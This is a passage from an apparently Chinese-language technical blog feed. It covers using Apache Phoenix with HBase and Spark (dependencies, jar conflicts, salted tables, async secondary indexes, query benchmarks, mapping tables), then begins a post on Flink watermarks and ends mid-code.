class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- phoenix spark--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.phoenix<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>phoenix-spark<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.14.0-HBase-1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.hbase<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hbase-client<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.phoenix<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>phoenix-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.14.0-HBase-1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>理论上只要用</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.phoenix<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>phoenix-server<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.14.0-cdh5.13.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>就能解决问题，但是这个依赖一直有问题，手动下载也没有解决加载问题</p><p>我们集群是5.13.3的，这边选择的是5.13.2的，应该能够兼容的，深入进去看里面的组件，其实HBase版本啥的都一样。</p><p>但是Phoenix4.14.0-CDH版本安装的时候在HBase-site.xml中已经有了两个改动，所以这边有两个选择，要么在代码中配置hbase的选项，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hbConfig.set(<span class="string">"phoenix.schema.isNamespaceMappingEnabled"</span>,<span class="string">"true"</span>);</span><br><span class="line">hbConfig.set(<span class="string">"phoenix.schema.mapSystemTablesToNamespace "</span>,<span class="string">"true"</span>);</span><br></pre></td></tr></table></figure><p>要么在resource文件夹中添加hbase-site.xml，后者更加方便一点。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">19</span>/<span class="number">10</span>/<span class="number">14</span> <span class="number">17</span>:<span class="number">07</span>:<span class="number">39</span> INFO ConnectionQueryServicesImpl: HConnection established. Stacktrace <span class="keyword">for</span> informational purposes: hconnection-<span class="number">0x1de9b505</span> java.lang.Thread.getStackTrace(Thread.java:<span class="number">1559</span>)</span><br><span class="line">org.apache.phoenix.util.LogUtil.getCallerStackTrace(LogUtil.java:<span class="number">55</span>)</span><br><span class="line">org.apache.phoenix.query.ConnectionQueryServicesImpl.openConnection(ConnectionQueryServicesImpl.java:<span class="number">427</span>)</span><br><span class="line">org.apache.phoenix.query.ConnectionQueryServicesImpl.access$<span class="number">400</span>(ConnectionQueryServicesImpl.java:<span class="number">267</span>)</span><br><span class="line">org.apache.phoenix.query.ConnectionQueryServicesImpl$<span class="number">12</span>.call(ConnectionQueryServicesImpl.java:<span class="number">2515</span>)</span><br><span class="line">org.apache.phoenix.query.ConnectionQueryServicesImpl$<span class="number">12</span>.call(ConnectionQueryServicesImpl.java:<span class="number">2491</span>)</span><br><span class="line">org.apache.phoenix.util.PhoenixContextExecutor.call(PhoenixContextExecutor.java:<span class="number">76</span>)</span><br><span class="line">org.apache.phoenix.query.ConnectionQueryServicesImpl.init(ConnectionQueryServicesImpl.java:<span class="number">2491</span>)</span><br><span class="line">org.apache.phoenix.jdbc.PhoenixDriver.getConnectionQueryServices(PhoenixDriver.java:<span class="number">255</span>)</span><br><span class="line">org.apache.phoenix.jdbc.PhoenixEmbeddedDriver.createConnection(PhoenixEmbeddedDriver.java:<span class="number">150</span>)</span><br><span class="line">org.apache.phoenix.jdbc.PhoenixDriver.connect(PhoenixDriver.java:<span class="number">221</span>)</span><br><span class="line">java.sql.DriverManager.getConnection(DriverManager.java:<span class="number">664</span>)</span><br><span class="line">java.sql.DriverManager.getConnection(DriverManager.java:<span class="number">208</span>)</span><br><span class="line">org.apache.phoenix.mapreduce.util.ConnectionUtil.getConnection(ConnectionUtil.java:<span class="number">113</span>)</span><br><span class="line">org.apache.phoenix.mapreduce.util.ConnectionUtil.getInputConnection(ConnectionUtil.java:<span class="number">58</span>)</span><br><span class="line">org.apache.phoenix.mapreduce.util.PhoenixConfigurationUtil.getSelectColumnMetadataList(PhoenixConfigurationUtil.java:<span class="number">354</span>)</span><br><span class="line">org.apache.phoenix.spark.PhoenixRDD.toDataFrame(PhoenixRDD.scala:<span class="number">118</span>)</span><br><span class="line">org.apache.phoenix.spark.PhoenixRelation.schema(PhoenixRelation.scala:<span class="number">60</span>)</span><br><span class="line">org.apache.spark.sql.execution.datasources.LogicalRelation.&lt;init&gt;(LogicalRelation.scala:<span class="number">40</span>)</span><br><span class="line">org.apache.spark.sql.SparkSession.baseRelationToDataFrame(SparkSession.scala:<span class="number">389</span>)</span><br><span class="line">org.apache.spark.sql.DataFrameReader.load(DataFrameReader.scala:<span class="number">146</span>)</span><br><span class="line">org.apache.spark.sql.DataFrameReader.load(DataFrameReader.scala:<span class="number">125</span>)</span><br><span class="line">phoenix.SparkPhoenixRead$.main(SparkPhoenixRead.scala:<span class="number">17</span>)</span><br><span class="line">phoenix.SparkPhoenixRead.main(SparkPhoenixRead.scala)</span><br></pre></td></tr></table></figure><p>配置完成之后，使用代码的时候，始终在报如上错误。</p><p>分析之后发现这并不是报错，而是长得像报错的日志格式。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ConnectionQueryServicesImpl.java</span></span><br><span class="line">logger.info(<span class="string">"HConnection established. Stacktrace for informational purposes: "</span> + connection + <span class="string">" "</span> +  LogUtil.getCallerStackTrace());</span><br><span class="line"><span class="comment">//LogUtil.java</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">getCallerStackTrace</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   StackTraceElement[] st = Thread.currentThread().getStackTrace();</span><br><span class="line">   StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">   <span class="keyword">for</span> (StackTraceElement element : st) &#123;</span><br><span class="line">       sb.append(element.toString());</span><br><span class="line">       sb.append(<span class="string">"\n"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">   <span class="keyword">return</span> sb.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>获取调用栈并记入日记，不是bug，==</p><p>最终使用的代码是Spark2.0以上格式的SparkSession</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//读取</span></span><br><span class="line"><span class="keyword">val</span> spark = <span class="type">SparkSession</span>.builder().master(<span class="string">"local[*]"</span>).appName(<span class="string">"sparkPhoenix"</span>).getOrCreate()</span><br><span class="line"></span><br><span class="line">   <span class="keyword">val</span> df = spark.read.format(<span class="string">"org.apache.phoenix.spark"</span>)</span><br><span class="line">    .option(<span class="string">"zkUrl"</span>,<span class="string">"172.16.0.127:2181"</span>)</span><br><span class="line">    .option(<span class="string">"table"</span>,<span class="string">"TABLE_NAME"</span>)</span><br><span class="line">    .load()</span><br><span class="line"></span><br><span class="line">   df.show()</span><br><span class="line"></span><br><span class="line">   spark.stop()</span><br></pre></td></tr></table></figure><p>Spark与Phoenix Jar包冲突说明：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--conf spark.driver.extraClassPath=phoenix-spark-4.14.0-HBase-1.2.jar --conf spark.executor.extraClassPath=phoenix-spark-4.14.0-HBase-1.2.jar</span><br></pre></td></tr></table></figure><h3 id="Phoenix-Jar包冲突（大坑）"><a href="#Phoenix-Jar包冲突（大坑）" class="headerlink" title="Phoenix Jar包冲突（大坑）"></a>Phoenix Jar包冲突（大坑）</h3><p>Jar包冲突的原因是HBase…这个包和CDH…这个包加载顺序的问题</p><p>先加载CDH这个包的话就会导致问题Jar包冲突，必须先加载HBase包，要手动指定。</p><p><img src="https://ws1.sinaimg.cn/large/bec9bff2ly1g8nb54lcgaj20dp0613yt.jpg" alt="8.png"></p><p>图上还缺少一个HBase包放在oozie的lib里面，这些是加载必备的。</p><p>不然会出现奇怪的错误，因为加载是随机加载的，如果先加载了CDH包就会报错。</p><h2 id="映射、索引分区"><a href="#映射、索引分区" class="headerlink" title="映射、索引分区"></a>映射、索引分区</h2><h3 id="映射："><a href="#映射：" class="headerlink" title="映射："></a>映射：</h3><p>默认情况下，直接在hbase中创建的表，通过phoenix是查看不到的</p><p>test是在hbase中直接创建的，默认情况下，在phoenix中是查看不到test的。</p><p>有两种映射方法，一种是视图映射，一种是表映射。</p><p>视图创建过后,直接删除,Hbase中的原表不会受影响,如果创建的是表映射,删除Phoenix中的映射表,会把原表也删除.</p><p><strong>一、基础知识</strong></p><p>Salted Table 是phoenix为了防止hbase表rowkey设计为自增序列而引发热点region读和热点region写而采取的一种表设计手段。通过在创建表的时候指定Salt_Buckets来实现pre-split，下面的建表语句建表的时候将会把表预分割到20个region里面。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE SALT_TEST (A_KEY VARCHAR PRIMARY KEY,</span><br><span class="line"> A_col VARCHAR) SALT_BUCKETS = 20</span><br></pre></td></tr></table></figure><p>默认情况下，对salted table 创建耳机索引，二级索引表会随同原表进行salted切分，salt_buckets与原表保持一致，当然，在创建耳机索引表的时候也可以自定义salt_buckets的数量，phoenix没有强制数量必须和原表一致。</p><p><strong>二、实现原理</strong></p><p>讲一个散列取余后的byte值插入到rowkey的第一个字节里，通过定义每个region的start key和end key将数据分割到不同region，以此来防止自增序列引入的热点问题。从而达到平衡hbase集群的读写性能问题。</p><p>salted byte的计算方式大致如下</p><p>hash(rowkey) % SALT_BUCKETS</p><p>默认下salted byte将作为每个region的start key及 end key，以此分割数据到不同的region，</p><p>这样能做到具有相同的salted byte处在一个region。</p><p><strong>三、本质</strong></p><p>本质就是在hbase中</p><p>rowkey前面加上一个字节，在表中实际存储时，就可以自动分布到不同的region中去了。</p><p><strong>四、实例</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE SALT_TEST (a_key VARCHAR PRIMARY KEY, a_col VARCHAR) SALT_BUCKETS = 4;</span><br><span class="line"></span><br><span class="line"> UPSERT INTO SALT_TEST(a_key, a_col) VALUES(&apos;key_abc&apos;, &apos;col_abc&apos;);</span><br><span class="line"> UPSERT INTO SALT_TEST(a_key, a_col) VALUES(&apos;key_ABC&apos;, &apos;col_ABC&apos;);</span><br><span class="line"> UPSERT INTO SALT_TEST(a_key, a_col) VALUES(&apos;key_rowkey01&apos;, &apos;col01&apos;);</span><br></pre></td></tr></table></figure><p>从Phoenix sqlline.py查询数据 看不出区别，去hbase scan 就能看到phoenix是在rowkey的第一个字节插入一个byte字节。</p><p><strong>五、注意</strong></p><p>每条rowkey前面加一个Byte，这里显示为16进制，创建完成之后，应该使用Phoenix SQL来读取数据，不要混合使用Phoenix Sql插入数据，使得原始rowkey前面被自动加上一个byte。</p><p><strong>同步索引和异步索引</strong></p><p>一般我可以使用create index来创建一个索引，这是一种同步的方法，但是有时候我们创建索引的表非常大，</p><p>我们需要等很长时间，Phoenix 4.5 以后有一个异步创建索引的方式，使用关键字ASYNC来创建索引：</p><p>实际上在二级索引中，我们需要先将phoenix的client包放入hbase的lib中然后在启动，这个IndexTool底层走的是MR，MR任务运行完毕后，索引会被自动引导，当我们在phoenix命令行中使用!table，看到索引表已经处于enable状态就可以使用该索引了。</p><p>官网demo里面的建立索引，仅仅针对一个字段，这样涉及稍微复杂的业务，索引并不能起效，还是全表索引。</p><p>二级索引分为以下几种：</p><p>全局索引、本地索引、覆盖索引</p><p>全局索引：</p><p>全局索引是默认索引类型，适用于读多写少的场景，由于全局索引会拦截（DELETE，UPSERT VALUES and UPSERT SELECT）数据更新并更新索引表，而索引表十分不在不用数据节点上的，跨节点的数据传输带来了较大的性能损耗。</p><p>本地索引</p><p>本地索引适用于少读多写</p><p>必须通过下面两部才能完成异步索引的构建。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CRAETE INDEX anync_index ON PHOENIX_ALARM_DIS(LAT,LNG,IMEI,CREATETIME) ASYNC</span><br></pre></td></tr></table></figure><p>创建异步索引，命令执行后一开始不会有数据，还必须使用单独的命令行工具来执行数据的创建，当语句给执行的时候，后端会启动mr任务，只有等到这个任务结束，数据都被生成在索引表中后，这个索引才能被使用，创建语句执行完后，还需要用工具导入数据。</p><p>官网说明：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">一般我们可以使用CREATE INDEX来创建一个索引，这是一种同步的方法。但是有时候我们创建索引的表非常大，我们需要等很长时间。Phoenix 4.5以后有一个异步创建索引的方式，使用关键字ASYNC来创建索引：</span><br><span class="line"> ​</span><br><span class="line"> CREATE INDEX index1_c ON hao1 (age) INCLUDE(name) ASYNC;</span><br><span class="line"> 这时候创建的索引表中不会有数据。你还必须要单独的使用命令行工具来执行数据的创建。当语句给执行的时候，后端会启动一个map reduce任务，只有等到这个任务结束，数据都被生成在索引表中后，这个索引才能被使用。启动工具的方法：</span><br><span class="line"> ​</span><br><span class="line"> $&#123;HBASE_HOME&#125;/bin/hbase org.apache.phoenix.mapreduce.index.IndexTool</span><br><span class="line"> --schema MY_SCHEMA --data-table MY_TABLE --index-table ASYNC_IDX</span><br><span class="line"> --output-path ASYNC_IDX_HFILES</span><br><span class="line"> 这个任务不会因为客户端给关闭而结束，是在后台运行。你可以在指定的文件ASYNC_IDX_HFILES中找到最终实行的结果。</span><br></pre></td></tr></table></figure><h2 id="测试和遇到的一些问题"><a href="#测试和遇到的一些问题" class="headerlink" title="测试和遇到的一些问题"></a>测试和遇到的一些问题</h2><p>使用Spark写入11亿5千万测试数据,分为24个分区,使用异步索引针对time和imei字段各建立了一个索引.</p><p>这边有个问题，索引在创建完成之后，数据类型自动变化了，详细：</p><p><img src="https://ws1.sinaimg.cn/large/bec9bff2ly1g8nc2o8bb9j20u105u0u5.jpg" alt="10.jpg"></p><p><img src="https://ws1.sinaimg.cn/large/bec9bff2ly1g8nc30qes4j20u10b8q5t.jpg" alt="11.jpg"></p><p>上面两张图分别是索引表和原数据表的数据类型，可以看到原表和索引表的数据类型并不相同，让人有点费解。</p><p>考虑到phoenix有很多时间种类和别的一些情况，于是提出了几种解决办法：</p><p>1.建表的时候不用timestamp作为时间类型</p><p>2.改二级索引表的字段类型，将decimal改为bigint</p><p>3.将seq_id建表时候，设置为not null，并属于联合主键</p><p>4.从搜索的角度考虑，能不能将搜索的数据类型更改</p><p>第一种方法尝试换了一种时间类型后，建立索引任然更改了为了decimal</p><p>第二种方法更改索引类型经过尝试后发现是不可行的</p><p>第三种方法和第四种方法是可行的，第四种方法更加简单</p><p>第四种方法，本来准备自己在代码中实现对时间的转换，后来发现phoenix SQL内置了timestamp转换</p><p>建立完成索引之后，直接</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> CREATETIME,IMEI,LAT,LNG <span class="keyword">from</span> PHOENIX_ALARM_DIS <span class="keyword">where</span> CREATETIME &gt; TO_TIMESTAMP(<span class="string">'2017-08-30 06:21:46.732'</span>);</span><br></pre></td></tr></table></figure><p>这种方式会引导查询走索引</p><p>关于索引，这边还有需要一提的就是，创建索引之后</p><p>例如：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">INDEX</span> INDEX_1 <span class="keyword">ON</span> <span class="keyword">TABLE</span>(A,B) <span class="keyword">INCLUDE</span> (C,D) ASYNC;</span><br></pre></td></tr></table></figure><p>创建索引之后并不能指定B为查询条件，explain会发现依然是在全局扫描，效率很低，这边稍微尝试了一下，在建立一个</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">INDEX</span> INDEX_1 <span class="keyword">ON</span> <span class="keyword">TABLE</span>(B,A) <span class="keyword">INCLUDE</span> (C,D) ASYNC;</span><br></pre></td></tr></table></figure><p>建立了两个索引之后，两个索引就占了大概80G的硬盘空间，这个表格用parquet.snappy格式存储之后才120G，真正是用空间换时间。</p><p>测试结果</p><p>下面分别是50并发 100并发 200并发的测试结果,</p><p>测试中现在Phoenix建表,用Spark写入,随机IMEI和时间段,时间长度为1天,用对应的线程数至少跑30分钟以上.,测试过程中的CPU使用量因为测试集群性能较高,使用最多不超过40%,所以没有记录.</p><p><img src="https://ws1.sinaimg.cn/large/bec9bff2ly1g8nc8ipu4pj20k50btgmf.jpg" alt="12.jpg"></p><p>50并发稳定后的查询大多在200ms以下.</p><p><img src="https://ws1.sinaimg.cn/large/bec9bff2ly1g8nc9c5l7mj20h60adwf4.jpg" alt="13.jpg"></p><p>100并发的查询时间大多数在400ms以下</p><p><img src="https://ws1.sinaimg.cn/large/bec9bff2ly1g8nc9w1eo4j20h40avq3j.jpg" alt="14.jpg"></p><p>200并发的查询大多数在500ms以下.</p><p>针对云车金融数据的测试:</p><p>云车金融测试采用映射表,原数据在HBase中,在Phoenix中建立映射表,把原先设计好的ROWKEY作为主键,建立映射表.</p><p>采用SQL模糊查询,因为没有并发要求,直接在命令行输入SQL查询.</p><p>针对某条IMEI单天的查询,反应时间在3-5s左右.</p><h3 id="关于映射表"><a href="#关于映射表" class="headerlink" title="关于映射表"></a>关于映射表</h3><p>官网有提及，映射表并不推荐用，数据从hbase写入，通过phoenix读取并不是个好主意，因为：</p><p>1.Phoenix创建的表有很多数据类型，但是从hbase映射表的话只能有一种类型：varchar，否则就会报错。字段只有varchar会给查询带来一定的麻烦。</p><p>2.大表的话创建映射表肯定会超时，需要根据版本修改配置信息，max超时时间拉大，拉到多少比较好，这个时间需要把握。</p><p>映射表如果因为这样或者那样的原因创建失败的话是不能直接删除的，直接删除会导致hbase原表也被删除，可以在SYSTEM.CATALOG中把和映射表有关的信息删除，比如：</p><p>delete from system.catalog where table_name = ‘MYTEST’;</p><p>就能把和关联表有关的信息全部删除了。</p><p>相比于HBase,性能上并没有优势</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Phoenix&quot;&gt;&lt;a href=&quot;#Phoenix&quot; class=&quot;headerlink&quot; title=&quot;Phoenix&quot;&gt;&lt;/a&gt;Phoenix&lt;/h1&gt;&lt;p&gt;Phoenix实践&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>WaterMark原理以及验证</title>
    <link href="http://yoursite.com/2019/09/05/WaterMark%E5%8E%9F%E7%90%86%E4%BB%A5%E5%8F%8A%E9%AA%8C%E8%AF%81/"/>
    <id>http://yoursite.com/2019/09/05/WaterMark原理以及验证/</id>
    <published>2019-09-05T10:25:59.031Z</published>
    <updated>2019-11-05T09:06:04.642Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>之前Flink的Watermark原理老是不明白，并且在CSDN上找的一篇文章，似乎是因为版本的问题，两年前的博客，代码验证下来始终有问题，在网上和人谈论之后，重新用代码验证了，才有点清晰明了，在此记录一下。</p></blockquote><a id="more"></a> <h3 id="WaterMark"><a href="#WaterMark" class="headerlink" title="WaterMark"></a>WaterMark</h3><p><img src="https://ws1.sinaimg.cn/large/bec9bff2ly1g8n9udtbw4j20xd0g4q9s.jpg" alt="1.png"></p><p>实时计算中，数据时间比较敏感。有<code>eventTime</code>和<code>processTime</code>区分，一般来说<code>eventTime</code>是从原始的消息中提取过来的，<code>processTime</code>是<code>Flink</code>自己提供的，<code>Flink</code>中一个亮点就是可以基于<code>eventTime</code>计算，这个功能很有用，因为实时数据可能会经过比较长的链路，多少会有延时，并且有很大的不确定性，对于一些需要精确体现事件变化趋势的场景中，单纯使用<code>processTime</code>显然是不合理的。</p><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p><code>watermark</code>是一种衡量<code>Event Time</code>进展的机制，它是数据本身的一个隐藏属性。通常基于Event Time的数据，自身都包含一个<code>timestamp.watermark</code>是用于处理乱序事件的，而正确的处理乱序事件，通常用<code>watermark</code>机制结合<code>window</code>来实现。</p><p>流处理从事件产生，到流经<code>source</code>，再到<code>operator</code>，中间是有一个过程和时间的。虽然大部分情况下，流到operator的数据都是按照事件产生的时间顺序来的，但是也不排除由于网络、背压等原因，导致乱序的产生（<code>out-of-order</code>或者说<code>late element</code>）。</p><p>但是对于<code>late element</code>，我们又不能无限期的等下去，必须要有个机制来保证一个特定的时间后，必须触发<code>window</code>去进行计算了。这个特别的机制，就是<code>watermark</code>。</p><h3 id="window划分"><a href="#window划分" class="headerlink" title="window划分"></a>window划分</h3><p><code>window</code>的设定无关数据本身，而是系统定义好了的。<br><code>window</code>是<code>flink</code>中划分数据一个基本单位，<code>window</code>的划分方式是固定的，默认会根据自然时间划分<code>window</code>，并且划分方式是前闭后开。</p><table><thead><tr><th>window划分</th><th>w1</th><th>w2</th><th>w3</th></tr></thead><tbody><tr><td>3s</td><td>[00:00:00~00:00:03)</td><td>[00:00:03~00:00:06)</td><td>[00:00:06~00:00:09)</td></tr><tr><td>5s</td><td>[00:00:00~00:00:05)</td><td>[00:00:05~00:00:10)</td><td>[00:00:10~00:00:15)</td></tr><tr><td>10s</td><td>[00:00:00~00:00:10)</td><td>[00:00:10~00:00:20)</td><td>[00:00:20~00:00:30)</td></tr><tr><td>1min</td><td>[00:00:00~00:01:00)</td><td>[00:01:00~00:02:00)</td><td>[00:02:00~00:03:00)</td></tr></tbody></table><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p>如果设置最大允许的乱序时间是10s，滚动时间窗口为5s</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"datetime"</span>:<span class="string">"2019-03-26 16:25:24"</span>,<span class="attr">"name"</span>:<span class="string">"zhangsan"</span>&#125;</span><br><span class="line">//currentThreadId:38,key:zhangsan,eventTime:[2019-03-26 16:25:24],currentMaxTimestamp:[2019-03-26 16:25:24],watermark:[2019-03-26 16:25:14]</span><br></pre></td></tr></table></figure><p>触达改记录的时间窗口应该为<code>2019-03-26 16:25:20~2019-03-26 16:25:25</code><br>即当有数据eventTime &gt;= 2019-03-26 16:25:35 时</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"datetime"</span>:<span class="string">"2019-03-26 16:25:35"</span>,<span class="attr">"name"</span>:<span class="string">"zhangsan"</span>&#125;</span><br><span class="line">//currentThreadId:38,key:zhangsan,eventTime:[2019-03-26 16:25:35],currentMaxTimestamp:[2019-03-26 16:25:35],watermark:[2019-03-26 16:25:25]</span><br><span class="line">//(zhangsan,1,2019-03-26 16:25:24,2019-03-26 16:25:24,2019-03-26 16:25:20,2019-03-26 16:25:25)</span><br></pre></td></tr></table></figure><h3 id="提取watermark"><a href="#提取watermark" class="headerlink" title="提取watermark"></a>提取watermark</h3><p>watermark的提取工作在taskManager中完成，意味着这项工作是并行进行的的，而watermark是一个全局的概念，就是一个整个Flink作业之后一个warkermark。</p><h3 id="AssignerWithPeriodicWatermarks"><a href="#AssignerWithPeriodicWatermarks" class="headerlink" title="AssignerWithPeriodicWatermarks"></a>AssignerWithPeriodicWatermarks</h3><p>定时提取watermark，这种方式会定时提取更新wartermark。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//默认200ms</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setStreamTimeCharacteristic</span><span class="params">(TimeCharacteristic characteristic)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.timeCharacteristic = Preconditions.checkNotNull(characteristic);</span><br><span class="line">    <span class="keyword">if</span> (characteristic == TimeCharacteristic.ProcessingTime) &#123;</span><br><span class="line">        getConfig().setAutoWatermarkInterval(<span class="number">0</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        getConfig().setAutoWatermarkInterval(<span class="number">200</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="AssignerWithPunctuatedWatermarks"><a href="#AssignerWithPunctuatedWatermarks" class="headerlink" title="AssignerWithPunctuatedWatermarks"></a>AssignerWithPunctuatedWatermarks</h3><p>伴随event的到来就提取watermark，就是每一个event到来的时候，就会提取一次Watermark。<br>这样的方式当然设置watermark更为精准，但是当数据量大的时候，频繁的更新wartermark会比较影响性能。<br>通常情况下采用定时提取就足够了。</p><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><h3 id="设置数据流时间特征"><a href="#设置数据流时间特征" class="headerlink" title="设置数据流时间特征"></a>设置数据流时间特征</h3><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//设置为事件时间</span></span><br><span class="line">env.setStreamTimeCharacteristic(<span class="type">TimeCharacteristic</span>.<span class="type">EventTime</span>)</span><br></pre></td></tr></table></figure><p>默认为<code>TimeCharacteristic.ProcessingTime</code>,默认水位线更新每隔200ms</p><p>入口文件</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span 